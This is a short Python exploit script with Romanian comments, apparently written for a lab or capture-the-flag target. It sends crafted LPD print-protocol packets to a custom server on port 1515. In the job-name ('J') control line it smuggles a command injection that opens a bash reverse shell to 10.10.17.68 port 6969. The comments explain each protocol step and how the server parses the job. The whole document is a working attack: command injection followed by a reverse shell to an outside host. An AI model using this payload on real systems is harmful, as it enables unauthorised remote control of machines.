import socket

host = '10.129.51.73'
port = 1515
nume_coada = "archive_intake"  # Trebuie să coincidă cu ce este în variabila de mediu LPD_QUEUE

# Conținutul pe care vrem să-l trimitem.
# Linia care începe cu "J" este esențială, deoarece serverul o caută pentru variabila `job_name`.
continut_job = b"Hlocalhost\nJ'&/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.68/6969 0>&1' &'\nDate simple de test\n"
dimensiune = len(continut_job)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    
    # PASUL 1: Trimiterea comenzii principale (0x02) + Numele cozii + \n
    # Exemplu brut: b'\x02test_queue\n'
    pachet_init = b'\x02' + nume_coada.encode() + b'\n'
    s.sendall(pachet_init)
    print(f"[*] Am trimis inițierea pentru coada: {nume_coada}")
    
    # PASUL 2: Trimiterea subcomenzii și a dimensiunii
    # Codul tău citește un chunk, ignoră primul byte (subcommand = chunk[0]), 
    # apoi ia textul de după el, dă split() și transformă primul element în int(size).
    # Exemplu brut: b'\x0225 test\n' (unde 25 este lungimea conținutului în octeți)
    pachet_dimensiune = b'\x02' + str(dimensiune).encode() + b' test_job\n'
    s.sendall(pachet_dimensiune)
    print(f"[*] Am trimis dimensiunea pachetului: {dimensiune} octeți")
    
    # PASUL 3: Așteptăm prima confirmare de la server (\x00)
    # Abia după ce primește chunk-ul cu dimensiunea, serverul execută: self.sock.send(b'\x00')
    ack = s.recv(1)
    if ack == b'\x01':
        print("[!] Eroare: Serverul a respins coada (Nume invalid / neconfigurat în LPD_QUEUE).")
        exit()
    elif ack == b'\x00':
        print("[+] Serverul a confirmat primirea metadatelor. Trimitem conținutul...")
    
    # PASUL 4: Trimiterea conținutului propriu-zis
    # Serverul va citi exact numărul de octeți specificat în variabila `dimensiune`
    s.sendall(continut_job)
    print("[*] Conținut trimis complet.")
    
    # PASUL 5: Citirea confirmărilor finale
    # La finalul procesării, serverul mai trimite doi octeți \x00
    raspuns_final = s.recv(1024)
    print(f"[+] Finalizat! Răspuns final server (hex): {raspuns_final.hex()}")
